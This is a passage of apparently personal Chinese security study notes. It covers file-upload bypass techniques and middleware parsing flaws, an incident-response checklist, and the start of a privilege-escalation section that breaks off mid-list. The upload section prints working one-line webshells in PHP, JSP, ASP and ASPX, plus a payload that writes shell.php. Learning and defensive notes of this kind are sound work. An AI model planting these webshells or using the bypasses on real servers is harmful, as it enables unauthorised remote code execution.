<h2 id="2-后端黑名单绕过"><a href="#2-后端黑名单绕过" class="headerlink" title="2.后端黑名单绕过"></a>2.后端黑名单绕过</h2><p>文件上传常见验证方式：</p>
<p>后缀名：黑名单(明确不让上传的格式后缀)、白名单(允许可上传的格式后缀，相对来说安全性高点)</p>
<p>文件类型：MIME信息(Content-type的值)</p>
<p>文件头：内容头信息，如gif的文件头是GIF89a</p>
<h4 id="演示案例"><a href="#演示案例" class="headerlink" title="演示案例:"></a>演示案例:</h4><p>upload-labs:<strong>Pass 1-12</strong></p>
<p>简要上传表单代码分析解释 </p>
<blockquote>
<p>$_FILES[表单中参数名][文件自带属性如(name&#x2F;type&#x2F;size)]</p>
<p>$_FILES[‘myfile’][‘name’]</p>
<p>$_FILES[‘myfile’][‘size’]</p>
<p>$_FILES[‘myfile’][‘type’]</p>
</blockquote>
<blockquote>
<p>&lt;form …&gt;<br>    &lt;input class&#x3D;”input_file” type&#x3D;”file” name&#x3D;”myfile”&#x2F;&gt;<br>    …<br>&lt;&#x2F;form&gt;</p>
</blockquote>
<h2 id="3-内容逻辑数组绕过"><a href="#3-内容逻辑数组绕过" class="headerlink" title="3.内容逻辑数组绕过"></a>3.内容逻辑数组绕过</h2><h4 id="演示案例：-1"><a href="#演示案例：-1" class="headerlink" title="演示案例："></a>演示案例：</h4><ul>
<li>upload-labs:<strong>Pass 13-20</strong></li>
<li>CVE-2017-12615-上传-Tomcat</li>
<li>中间件解析漏洞+配合文件上传测试<ul>
<li>IIS-上传-解析-(panfei806)</li>
<li>Apache-上传-解析-vulhub</li>
<li>Nginx-上传-解析-vulhub</li>
</ul>
</li>
</ul>
<h4 id="中间件解析漏洞："><a href="#中间件解析漏洞：" class="headerlink" title="中间件解析漏洞："></a>中间件解析漏洞：</h4><p>解析漏洞</p>
<h5 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h5><p>​		xxx.jpg%00.php(Nginx&lt;8.03 空字节代码执行漏洞，前提关闭了fast-cgi)<br>​		fix_pathinfo<br>​			&#x2F;1.jpg&#x2F;1.php<br>​			&#x2F;1.jpg%00.php &#x2F;&#x2F;相当于上传的图片码，但可以通过这个操作去执行图片的php代码<br>​			&#x2F;1.jpg&#x2F;%20\0.php &#x2F;&#x2F;文件名逻辑漏洞（让图片作为php文件解析）</p>
<h5 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h5><p>​		IIS5.x-IIS6.x<br>​			&#x2F;xx.asp&#x2F;xx.jpg  &#x2F;&#x2F;将.asp目录下的文件解析成asp文件<br>​			xx.asp;jpg  &#x2F;&#x2F;服务器默认不解析分号后面的后缀，所以可以实现后缀绕过<br>​			test.asa test.cer test.cdx<br>​		IIS7.5</p>
<p>前提是fast-cgi开启：&#x2F;&#x2F; 123.***&#x2F;.php 加了后面的&#x2F;.php访问的话，默认将123.***识别为php文件执行。</p>
<p>如果shell语句为：</p>
<p><code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt; </code></p>
<p>如果能上传一个图片马，记为test.jpg，访问test.jpg&#x2F;**.php，当前目录下会生成一句话木马shell.php</p>
<p>​			a.aspx.a;a.aspx.jog.jpg </p>
<h5 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h5><p>​		test.php.php123  从右到左开始判断解析<br>​		AddHandler php5-script.php     test2.php.jpg<br>​		AddType application&#x2F;x-httpd-php .jpg     即使扩展名是jpg,一样能以php方式执行</p>
<h2 id="windows特性绕过"><a href="#windows特性绕过" class="headerlink" title="windows特性绕过"></a>windows特性绕过</h2><p>黑名单，但是没有对后缀名进行去”.”处理，利用windows特性，会自动去掉后缀名中最后的”.”，可在后缀名中加”.”绕过。</p>
<p>大小写不区分,test.txt与Test.txt一样</p>
<p><strong>以下均为同一个文件：</strong></p>
<blockquote>
<p>“test.asp”<br>“Test.asp”<br>“TEST.ASP”<br>“test.asp.”<br>“test.asp “<br>“TEST.asp …”<br>“test.asp:1.jpg..”<br>“Test.asp ..   … “<br>“test.asp .. .�”    （乱码字符是ascii值为 0xC8 的不可打印字符）<br>————————————————<br>版权声明：本文为CSDN博主「三体-二向箔」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/weixin_39157582/article/details/108282573">https://blog.csdn.net/weixin_39157582/article/details/108282573</a></p>
</blockquote>
<p>如调用系统函数建立“test.:jpg”文件，因为“:”截断，实质上会生成“test.”文件，又因为Windows系统会吃掉“.”，所以，右键删除，识别不了该文件。尝试删除掉，会文件异常。</p>
<h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><h3 id="jsp版"><a href="#jsp版" class="headerlink" title="jsp版"></a>jsp版</h3><p>相关函数</p>
<ol>
<li>java.lang.Runtime.exec()</li>
<li>java.lang.ProcessBuilder.start()</li>
</ol>
<p><code>&lt;% Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;));%&gt;</code></p>
<p><code>类似于&lt;?PHP eval($GET_[&#39;i&#39;]);?&gt;</code></p>
<p>但是 jsp 一句话没有回显，无法看到返回的信息，通常用来反弹 shell</p>
<h2 id="asp版"><a href="#asp版" class="headerlink" title="asp版"></a>asp版</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%eval request(&quot;MH&quot;)%&gt;</span><br><span class="line">&lt;%execute request(&quot;MH&quot;)%&gt;</span><br><span class="line">&lt;%execute(request(&quot;MH&quot;))%&gt;</span><br><span class="line">&lt;%If Request(&quot;MH&quot;)&lt;&gt;&quot;&quot; Then Execute(Request(&quot;MH&quot;))%&gt;</span><br><span class="line">&lt;%eval(Request.Item[&quot;MH&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure>

<h2 id="aspx"><a href="#aspx" class="headerlink" title="aspx"></a>aspx</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;chopper&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>web漏洞</category>
        <category>文件上传</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>应急响应</title>
    <url>/2023/06/07/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
    <content><![CDATA[<h1 id="1-应急响应是什么"><a href="#1-应急响应是什么" class="headerlink" title="1.应急响应是什么"></a>1.应急响应是什么</h1><p>指针对已经发生或可能发生的安全事件进行监控、分析、协调、处理、保护资产安全。主要是为了人们对网络安全有所认识、有所准备，以便在遇到突发网络安全事件时做到有序应对、妥善处理。</p>
<h1 id="2-PDCERF-6阶段"><a href="#2-PDCERF-6阶段" class="headerlink" title="2.PDCERF(6阶段)"></a>2.PDCERF(6阶段)</h1><ol>
<li><p>准备阶段：预防，扫描、风险分析、补丁；制定可以实现应急响应目标的策略和规程，建立能够集合起来处理突发事件的体系。</p>
<p><strong>准备用来检测的工具和人，比如说ls、losf、ss、ifconfig这些东西</strong></p>
</li>
<li><p>检测阶段：检测事件是已经发生的还是正在进行中的；找出事件产生原因，确定事件性质和严重性、预计修复时采用的专用资源</p>
<p><strong>紧急事件监测：包括防火墙、系统、web服务器、IDS&#x2F;WAF&#x2F;SIEM中的日志，不正常或者是执行了越权操作的用户，甚至还有管理员的报告（可以是邮件也可以电话短信什么的你可以看到听到的东西），我们要从这些数据中判断出受灾面积和攻击者入侵的点</strong></p>
</li>
<li><p>抑制阶段：限制被破坏的范围。策略：完全关闭所有系统；从网络上断开主机或断开网络部分；修改所有防火墙和路由器过滤规则；封锁或删除被攻击的登录账号；加强对系统和网络行为的监控；设置诱饵服务器进一步获取事件信息；关闭受攻击的系统或其它相关系统的部分服务。</p>
</li>
<li><p>根除阶段：:通过事件分析找出根源并彻底根除，以避免攻击者再次使用相同的手段攻击系统。</p>
</li>
<li><p>恢复阶段：把被破坏的信息彻底恢复到正常运作状态。</p>
</li>
<li><p>攻击跟踪：据各种监控去确定没有其他的攻击行为和攻击向量，紧接着就是开会反省此次事件，写报告，持续改进工作流程和工作缓解</p>
</li>
</ol>
<h1 id="3-评价安全标准"><a href="#3-评价安全标准" class="headerlink" title="3.评价安全标准"></a>3.评价安全标准</h1><p>评价企业安全建设做的好与坏的标准就是ROI（投资回报率），即攻击者攻击的成本是10元，你去防御这个攻击的成本是1毛，说明这个安全建设是有效的。</p>
<h1 id="4-SDL"><a href="#4-SDL" class="headerlink" title="4.SDL"></a>4.SDL</h1><p>security development lifecycle，即安全开发生命周期。</p>
<p>目的：从安全漏洞产生的根源上解决应用安全问题，通过对软件开发流程的控制，保证产品的安全性。</p>
<p>SDL是全面软件生命周期管理与最佳实践手段和工具相结合的产物，使用SDL方式可有效提升系统的安全等级，并将安全工作提升到可进行标准化实施的程度。微软的SDL理论基于三个核心概念开展：培训、持续的安全问题改进和问责制。SDL的目标是减少应用软件的漏洞数量级和严重程度，其完整生命周期主要阶段</p>
<p>SDL的第一步就是安全培训。</p>
<h2 id="安全培训内容"><a href="#安全培训内容" class="headerlink" title="安全培训内容"></a>安全培训内容</h2><p>Part 1：安全设计：包括减小攻击面、深度防御、最小权限原则、服务器安全配置等<br>Part 2：威胁建模：概述、设计意义、基于威胁建模的编码约束<br>Part 3：安全编码：缓冲区溢出（针对C&#x2F;C++）、整数算法错误（针对C&#x2F;C++）、XSS&#x2F;CSRF（对于Web类应用）、SQL注入（对于Web类应用）、弱加密<br>Part 4：安全测试：安全测试和黑盒测试的区别、风险评估、安全测试方法（代码审计、fuzz等）<br>Part 5：隐私与敏感数据：敏感数据类型、风险评估、隐私开发和测试的最佳实践<br>Part 6：高级概念：高级安全概念、可信用户界面设计、安全漏洞细节、自定义威胁缓解</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230619214555452.png" alt="完整周期主要阶段"></p>
<h1 id="5-场景与处理流程"><a href="#5-场景与处理流程" class="headerlink" title="5.场景与处理流程"></a>5.场景与处理流程</h1><h2 id="1-场景"><a href="#1-场景" class="headerlink" title="1.场景"></a>1.场景</h2><p>勒索病毒、挖矿木马、Webshell、网页篡改、DDos攻击、数据泄露、流量劫持。</p>
<h2 id="2-处理流程"><a href="#2-处理流程" class="headerlink" title="2.处理流程"></a>2.处理流程</h2><p>事件类型</p>
<p>时间范围</p>
<h3 id="系统排查"><a href="#系统排查" class="headerlink" title="系统排查"></a>系统排查</h3><h4 id="a-系统基本信息"><a href="#a-系统基本信息" class="headerlink" title="a.系统基本信息"></a>a.系统基本信息</h4><p>windows</p>
<blockquote>
<p>msinfo32：系统信息，显示本地计算机的硬件资源、组件和软件环境信息。正在运行任务、服务、系统驱动程序、加载的模块、启动程序等进行排查。<br>systeminfo：系统信息，主机名、操作系统版本等详细信息。</p>
</blockquote>
<p>Linux</p>
<blockquote>
<p>lscpu：CPU信息，型号、主频、内核等。</p>
<p>uname -a：操作系统信息</p>
<p>cat &#x2F;proc&#x2F;version：操作系统版本信息</p>
<p>lsmod：所有载入系统的模块信息</p>
</blockquote>
<h4 id="b-用户信息"><a href="#b-用户信息" class="headerlink" title="b.用户信息"></a>b.用户信息</h4><p>windows</p>
<blockquote>
<p>net user：查看用户账户信息（看不到以$结尾的隐藏用户）<br>net user username：查看用户名为username用户的详细信息； lusrmgr.msc：打开本地用户与组，可查看隐藏用户；<br>打开计算机管理-本地用户与组可查看隐藏用户;</p>
<p>wmic useraccount get name,sid：查看系统中的所有用户；<br>注册表查看是否存在克隆账户：regedit打开注册表，选择HKEY_LOCAL_MACHHINE下的SAM选项，为该项添加允许父项的继承权限传播到该对象和所有子对象。包括那些在此明确定义的目标和用在此显示的可以应用到子对象的项目替代所有子对象的权限项目权限，使当前用户拥有SAM的读取权限。添加之后F5刷新即可访问子项并查看用户信息。同时，在此项下导出所有00000开头的项，将所有导出的项与000001F4（对应Administrator用户）导出内容做比较，若其中的F值相同，则表示可能为克隆账户。</p>
</blockquote>
<p>Linux</p>
<blockquote>
<p>查看所有用户信息：cat &#x2F;etc&#x2F;passwd<br>后续各项由冒号隔开，分别表示用户名、密码加密、用户ID、用户组ID、注释、用户主目录、默认登录shell。最后显示bin&#x2F;bash的，表示账户状态可登录，显示sbin&#x2F;nologin的，不可登陆。</p>
<p>awk -F: ‘{if($3&#x3D;&#x3D;0)print<br>$1}’ &#x2F;etc&#x2F;passwd ：查询登录账户UID&#x3D;0的账户，root是uid等于0的账户，如果出现其它的账户，就要重点排查；</p>
<p>查看可登录账户：cat &#x2F;etc&#x2F;passwd | grep ‘&#x2F;bin&#x2F;bash’</p>
<p>查看用户错误的登录信息：lastb（包括错误的登录方法、ip、时间等） </p>
<p>查看所有用户最后的登录信息：lastlog</p>
<p>查看用户最近登录信息：last </p>
<p>查看当前用户登录系统信息：who </p>
<p>查看空口令账户：awk -F: ‘length($2)&#x3D;&#x3D;0 {print$1}’ &#x2F;etc&#x2F;shadow</p>
</blockquote>
<h4 id="c-启动项"><a href="#c-启动项" class="headerlink" title="c.启动项"></a>c.启动项</h4><p>是开机系统在前台或者后台运行的程序，是病毒等实现持久化驻留的常用方法。</p>
<p>Windows</p>
<blockquote>
<p>msconfig：可查看启动项的详细信息；</p>
<p>注册表查看：</p>
<p>HKEY_CLASSES_ROOT:此处存储的信息可确保在windows资源管理器中执行时打开正确的程序。它还包含有关拖放规则、快捷方法和用户界面信息的更多详细信息；<br>HKEY_CURRENT_USER:包含当前登录系统的用户的配置信息，有用户的文件夹、屏幕颜色和控制面板设置；<br>HKEY_LOCAL_MACHINE:包含运行操作系统的硬件特定信息，有系统上安装的驱动器列表及已安装硬件和应用程序的通用配置；<br>HKEY_USERS：包含系统上所有用户的配置信息，有应用程序配置和可视配置；<br>HKEY_CURRENT_CONFIG:存储有关系统当前配置信息</p>
<p>查看注册表中的信息：reg query<br>“HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run”</p>
</blockquote>
<p>Linux</p>
<blockquote>
<p>cat &#x2F;etc&#x2F;init.d&#x2F;rc.local cat &#x2F;etc&#x2F;rc.local ls -alt &#x2F;etc&#x2F;init.d<br>查看init.d文件夹下的所有文件的详细信息</p>
</blockquote>
<h4 id="d-任务计划"><a href="#d-任务计划" class="headerlink" title="d.任务计划"></a>d.任务计划</h4><p>很多计算机都会自动加载“任务计划”，因此任务计划也是病毒实现持久化驻留的一种常用手段</p>
<p>Windows</p>
<blockquote>
<p>eventvwr：打开事件查看器，可看日志<br>打开计算机管理——系统工具——任务计划程序——任务计划程序库：可查看任务计划的名称、状态、触发器等信息；<br>命令行输入schtasks：可获取任务计划信息，要求是本地Administrator组的成员；<br>在PowerShell下输入get-scheduledtask 可查看当前系统中所有任务计划信息，包括路径、名称、状态等详细信息。</p>
</blockquote>
<p>Linux</p>
<blockquote>
<p>crontab -l：可查看当前任务计划 </p>
<p>crontab -u root -l：查看root用户的任务计划（指定用户）</p>
<p>查看etc目录下的任务计划文件：一般在linux系统中的任务计划文件是以cron开头的，可以利用正则表达式的筛选出etc目录下的所有以cron开头的文件，具体表达式为&#x2F;etc&#x2F;cron,例如查看etc目录下的所有任务计划文件就可以输入ls &#x2F;etc&#x2F;cron命令。<br>&#x2F;etc&#x2F;crontab<br>&#x2F;etc&#x2F;cron.d&#x2F;<br>&#x2F;etc&#x2F;cron.daily&#x2F;*<br>&#x2F;etc&#x2F;cron.hourly&#x2F;*<br>&#x2F;etc&#x2F;cron.monthly&#x2F;*<br>&#x2F;etc&#x2F;cron.weekly&#x2F;<br>&#x2F;etc&#x2F;anacrontab</p>
</blockquote>
<h4 id="e-其它"><a href="#e-其它" class="headerlink" title="e.其它"></a>e.其它</h4><p>windows防火墙的入站规则和出站规则 :</p>
<blockquote>
<p>netsh ：</p>
<p>netsh firewall show state:显示当前防火墙的网络配置状态</p>
</blockquote>
<p><img src="/../../../Typora/img111/image-20230615144413717.png" alt="netsh"></p>
<h3 id="进程排查"><a href="#进程排查" class="headerlink" title="进程排查"></a>进程排查</h3><p>进程即，系统进行资源分配和调度的基本单位；</p>
<p>主机在感染恶意程序后，恶意程序都会启动相应的进程，来完成相关的恶意操作，有的恶意进程为了不被查杀，还会启动相应的守护进程来对恶意进程进行守护。</p>
<p>Windows</p>
<blockquote>
<p>通过任务管理器查看;</p>
<p>命令行的话：</p>
<p>tasklist：可显示计算机中的所有进程，可查看进程的映像名称、PID、会话等信息；</p>
<p>tasklist &#x2F;svc：可以显示每个进程和服务对应的情况；</p>
<p> tasklist &#x2F;m：查询加载的DLL </p>
<p>tasklist &#x2F;m wmiutils.dll:查询特定dll的调用情况 </p>
<p>tasklist &#x2F;svc &#x2F;fi “pid eq 284”：过滤器功能，eq等于、nq不等于、gt大于、lt小于、ge大于等于、le小于等于</p>
</blockquote>
<blockquote>
<p>netstat：可显示网络连接的信息，包括活动的TCP连接、路由器和网络接口信息，是一个监控TCP&#x2F;IP网络的工具。<br>端口定位程序：通过netstat定位处PID，然后用tasklist查看具体的程序，</p>
<p>例如：netstat -ano |findstr “3306” </p>
<p>定位出pid&#x3D;6616: tasklist |find “6616” </p>
<p>netstat -anb 3306：端口快速定位程序，需要管理员权限；</p>
<p> powershell排查：对于有守护进程的进程，需要确认子父进程之间的关系<br>get-wmiobject win32_process | select<br>name,processid,parentprocessid,path<br>wmic命令查询：可对进程进行查询以csv格式来显示进程名称、父进程id、进程id </p>
<p>wmic process get<br>name,parentprocessid,processid（&#x2F;format:csv），实验了一下，括号可以去掉，否则提示此级别开关异常</p>
</blockquote>
<p>Linux</p>
<blockquote>
<p>netstat:分析可以端口、分析可疑ip地址、可疑pid及程序进程； </p>
<p>（待验证：↓）</p>
<p><strong>ls -alt &#x2F;proc&#x2F;PID：查看PID为600的进程可执行程序；</strong></p>
<p> <strong>lsof -p PID:查看进程所打开的文件；</strong></p>
<p> <strong>kill -9 PID：结束进程；</strong><br><strong>rm -rf filename ：删除名为filename的文件；</strong><br><strong>如果root用户都无法删除相关文件，可能是因为该文件被加上了i属性，使用lsattr filename 查看文件属性，然后用chattr -i filename 可移除i属性，进而删除文件。也有因为进程存在守护进程而无法被删除，可先将进程挂起，查杀守护进程后，再返回将进程删除。</strong></p>
<p><strong>补充：chattr +i filename 加i属性。</strong></p>
<p> <strong>查看隐藏进程：顺序执行以下三条命令</strong><br><strong>ps -ef | awk ‘{print}’|sort -n |uniq&gt;1 ls &#x2F;proc |sort -n |uniq&gt;2</strong><br><strong>diff 1 2 top：可用于挖矿进程排查，显示占用率较高的进程。</strong></p>
</blockquote>
<h3 id="服务排查"><a href="#服务排查" class="headerlink" title="服务排查"></a>服务排查</h3><p>运行在后台的进程，服务可以在计算机启动时自动启动，也可暂停和重启，而且不显示任何用户界面，服务非常适合在服务器上使用，通常在为了不影响在同一天计算机上工作的其它用户，且需要长时间运行功能时使用。在应急响应中，服务作为一种运行在后台的进程，是恶意软件常用的驻留方法。</p>
<p>Windows</p>
<blockquote>
<p>services.msc：打开服务窗口，查看所有的服务项，包括服务的名称、描述、状态等。</p>
</blockquote>
<p>Linux</p>
<blockquote>
<p>chkconfig –list：可查看系统运行的服务；<br>service –status-all：可查看所有服务的状态；</p>
</blockquote>
<h3 id="文件痕迹排查"><a href="#文件痕迹排查" class="headerlink" title="文件痕迹排查"></a>文件痕迹排查</h3><p>排查思路：</p>
<blockquote>
<ol>
<li>对恶意软件常用的敏感路径进行排查；</li>
<li>在确定了应急响应事件的时间点后，对时间点前后的文件进行排查；</li>
<li>对带有特征的恶意软件进行排查，包括代码关键字或关键函数、文件权限特征。</li>
</ol>
</blockquote>
<p>Windows</p>
<blockquote>
<p>敏感目录<br>各个盘下的temp(tmp)相关目录，有些恶意程序释放字体(即恶意程序运行时投放出的文件)一般会在程序中写好投放的路径，由于不同系统版本的路径有所差别，但临时文件的路径相对统一，因此在程序中写好的路径一般是临时路径；</p>
</blockquote>
<blockquote>
<p>查看浏览器历史记录、下载文件和cookie信息：攻击者可能会下载一些后续攻击工具；</p>
</blockquote>
<blockquote>
<p>查看用户Recent文件：存储最近运行文件的快捷方式，一般在windows中的路径为： C:\Document and<br>Settings\Administrator(系统用户名)\Recent C:\Document and Settings\Default<br>User\Recent<br>Prefetch：预读取文件夹，存放系统已经访问过的文件的读取信息，扩展名为pf，可加快系统启动进程，</p>
<p>启动：%systemroot%\prefetch amcache.hve:可查看应用程序执行路径、上次执行时间及sha1值。</p>
<p>启动：%systemroot%\appcompat\programs<br>时间点查找 forfiles 攻击者可能会对时间动手脚 webshell<br>D盾、HwsKill、WebshellKill等工具对目录下的文件进行规则查询，</p>
</blockquote>
<p>Linux</p>
<blockquote>
<p>敏感目录 &#x2F;tmp、 &#x2F;usr&#x2F;bin、 &#x2F;usr&#x2F;sbin：经常作为恶意软件下载目录及相关文件被替换的目录；<br>~&#x2F;.ssh、&#x2F;etc&#x2F;ssh：经常作为后门配置的路径</p>
</blockquote>
<blockquote>
<p>时间点查找 find：可对某一时间段内增加的文件进行查找；<br>stat：对文件的创建时间、修改时间、访问时间进行排查；</p>
</blockquote>
<blockquote>
<p>特殊文件<br>查找777权限的文件：find &#x2F;tmp -perm 777</p>
</blockquote>
<blockquote>
<p>webshell查找<br>初筛：find &#x2F;var&#x2F;www&#x2F; -name “*.php”<br>工具：findWebshell、Scan_Webshell.py扫描排查</p>
</blockquote>
<blockquote>
<p>对系统命令进行排查<br>ls、ps可能被攻击者替换，</p>
<p>ls -alt &#x2F;bin 查看命令目录中的系统命令的修改时间进行排查；<br>ls -alh &#x2F;bin：查看相关文件大小，若明显偏大，则文件很可能被替换；</p>
</blockquote>
<blockquote>
<p>linux后门检测<br>工具:chkrootkit（出现infected说明有后门）、rkhunter 排查suid程序<br>find &#x2F;-type f -perm -04000 -ls -uid 0 2 &gt;&#x2F;dev&#x2F;null</p>
</blockquote>
<h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><p>Windows：</p>
<p>在运行对话框中输入eventvwr，打开事件查看器窗口，可查看windows相关日志。</p>
<blockquote>
<p>系统日志：%SystemRoot%\System32\Winevt\Logs\System.evtx 系统中的各个组件在运行中产生的各种事件</p>
</blockquote>
<blockquote>
<p>安全性日志:%SystemRoot%\System32\Winevt\Logs\security.evtx<br>记录各种安全相关的事件，登录操作、对系统文件进行创建、删除、更改等操作。</p>
</blockquote>
<blockquote>
<p>应用程序日志：%SystemRoot%\System32\Winevt\Logs\Application.evtx</p>
</blockquote>
<blockquote>
<p>日志常用事件id 4624：登陆成功 4625：登录失败</p>
</blockquote>
<blockquote>
<p>日志分析<br>日志筛选器进行分析<br>PowerShell分析 Get-WinEvent Get-WinEvent Security -InstanceId 4625:获取安全性日志下事件id为4625的所有日志信息。<br>使用工具</p>
</blockquote>
<p>Linux</p>
<p>linux系统日志一般在&#x2F;var&#x2F;log&#x2F;下</p>
<blockquote>
<p>&#x2F;var&#x2F;log&#x2F;wtmp：记录登录进入、退出、数据交换、关机和重启，及last</p>
<p>&#x2F;var&#x2F;log&#x2F;cron：记录与定时任务相关的日志信息；</p>
<p>&#x2F;var&#x2F;log&#x2F;message:记录系统启动后的信息和错误日志；</p>
<p>&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log：记录apache的访问日志；</p>
<p>&#x2F;var&#x2F;log&#x2F;auth.log：记录系统授权信息，包括用户登录和使用的权限机制等；<br>…<br>日志分析<br>…<br>其它日志<br>除了windows、linux系统日志分析外，还有Web日志、中间件日志、数据库日志、FTP日志等进行分析。</p>
</blockquote>
<blockquote>
<p>IIS日志<br>%systemdrive%\inetpub\logs\logfiles<br>%systemroot%\system32\logfiles\w3svc1</p>
</blockquote>
<p>…</p>
<blockquote>
<p>Apache日志<br>&#x2F;var&#x2F;log&#x2F;httpd&#x2F;access.log<br>&#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log<br>&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log<br>&#x2F;var&#x2F;log&#x2F;httpd-access.log</p>
</blockquote>
<blockquote>
<p>Nginx日志<br>默认在&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;logs目录下，access.log代表访问日志，error.log代表错误日志。若没在默认路径下，则可到nginx.conf配置文件中查找。</p>
</blockquote>
<blockquote>
<p>Tomcat日志 tomcat&#x2F;log下 Vsftp日志<br>&#x2F;var&#x2F;log&#x2F;messages 可通过编辑&#x2F;etc&#x2F;vsftp&#x2F;vsftp.conf配置文件来启用单独的日志，启用后，可访问vsftp.log和xferlog。</p>
</blockquote>
<blockquote>
<p>Weblogic日志<br>有三种日志：access log、 server log 、 domain log。</p>
</blockquote>
<blockquote>
<p>数据库日志</p>
<pre><code>        Oracle
            select * from v$logfile：查询日志命令，默认在$ORACLE/rdbms/log目录下，
            select * from v$sql：可查询之前使用的sql；
        Mysql
            默认路径：/var/log/mysql/
            可查看日志是否开启：show variables like &#39;general&#39;;
            开启日志：set global general_log = &#39;ON&#39;;
        Mssql
            一般无法查看，需要登录到SQL Server Management Studio,在管理——SQL Server日志 中查看。
</code></pre>
</blockquote>
<p>内存分析</p>
<p>流量分析</p>
<p>威胁情报</p>
<p>得出结论</p>
<h1 id="6-参考"><a href="#6-参考" class="headerlink" title="6.参考"></a>6.参考</h1><p><a href="https://blog.csdn.net/qq_45697116/article/details/125194266?ops_request_misc=%7B%22request_id%22:%22168679554016800186533333%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168679554016800186533333&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-125194266-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94&spm=1018.2226.3001.4187">网络安全应急响应(归纳)_003安全实验室的博客-CSDN博客</a></p>
]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title>提权</title>
    <url>/2023/07/01/%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="1-1-权限说明"><a href="#1-1-权限说明" class="headerlink" title="1.1.权限说明"></a>1.1.权限说明</h1><blockquote>
<ul>
<li>后台权限:SQL注入,致据库备份泄露，默认或弱口令等获取帐号密码进入。</li>
<li>网站权限:后台提升至网站权限，RCE或文件操作类、反序列化等漏洞直达shell。</li>
<li>数据库权限:SQL注入数据库备份泄露。默认或弱口令等进入或网站权限获取后转入。</li>
<li>接口权限:SQL注入,数据库备份泄露，源码泄漏，配置不当等或网站权限获取后转入。</li>
<li>系统权限:高危系统漏洞直达或网站权限提升转入、数据库权限提升转入。第三方转入等。</li>
<li>域控权限:高危系统漏洞直达或内网横向渗透转入，域控其他服务安全转入等。</li>
</ul>
</blockquote>
<h1 id="1-2-权限提升流程"><a href="#1-2-权限提升流程" class="headerlink" title="1.2.权限提升流程"></a>1.2.权限提升流程</h1><p>后台权限&gt;web权限&gt;系统权限&gt;域控权限</p>
<h1 id="1-3-中间件语言类权限"><a href="#1-3-中间件语言类权限" class="headerlink" title="1.3.中间件语言类权限"></a>1.3.中间件语言类权限</h1><p>jsp、java搭建的站点连接上后直接就是系统权限。</p>
<h1 id="2-1-windows"><a href="#2-1-windows" class="headerlink" title="2.1.windows:"></a>2.1.windows:</h1><p>Windows提权大概有三个方向：溢出提权、数据库提权、第三方软件提权、错误的系统配置提权、组策略首选项提权、窃取令牌提权、bypassuac提权，第三方软件&#x2F;服务提权，WEB中间件漏洞提权等。</p>
<p>如果遇到无法执行命令的话，可以试着上传cmd.exe文件之可执行的目录下。</p>
<h2 id="2-1-1常见命令"><a href="#2-1-1常见命令" class="headerlink" title="2.1.1常见命令"></a>2.1.1常见命令</h2><blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systeminfo 查询系统信息</span><br><span class="line">hostname   主机名</span><br><span class="line">net user   查看用户信息</span><br><span class="line">netstat -ano|find &quot;3389&quot;   查看服务pid号</span><br><span class="line">wmic os get caption       查看系统名</span><br><span class="line">wmic qfe get Description,HotFixID,InstalledOn   查看补丁信息</span><br><span class="line">wmic product get name,version   查看当前安装程序</span><br><span class="line">wmic service list brief   查询本机服务</span><br><span class="line">wmic process list brief   查询本机进程</span><br><span class="line">net share   查看本机共享列表</span><br><span class="line">netsh firewall show config 查看防火墙配置</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="2-1-2提权方式"><a href="#2-1-2提权方式" class="headerlink" title="2.1.2提权方式"></a>2.1.2提权方式</h2><p>一般通过找对应版本的exp，去进行利用</p>
<p>利用cs工具，监听成功后，去用插件提权</p>
<p>msf</p>
<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>winPEAS</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS</span><br><span class="line">WinPEAS 是一个脚本，用于枚举目标系统以发现权限升级路径。</span><br></pre></td></tr></table></figure>

<p>accesschk</p>
